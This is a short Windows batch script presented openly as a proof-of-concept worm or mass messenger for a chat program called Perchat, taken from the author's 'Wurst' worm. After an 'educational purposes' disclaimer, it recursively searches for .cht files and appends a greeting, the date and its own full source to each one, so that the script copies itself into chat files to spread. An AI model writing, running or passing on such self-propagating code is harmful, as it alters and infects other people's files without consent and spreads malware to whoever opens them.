@echo off
echo This is a proof-of-concept worm/mass messenger for Perchat.
echo The code was taken from my "Wurst" worm, which mass messages itself.
echo:
echo This is for educational purposes (so is my Wurst worm). I am not responsible for any of your actions.
echo:
pause
for /r %%i in (*.cht) do (
echo: >> %%i
echo HI! -QTPI %date% >> %%i 
type %0 >> %%i
echo: >> %%i
echo -QTPI %date% >> %%i
echo: >> %%i)
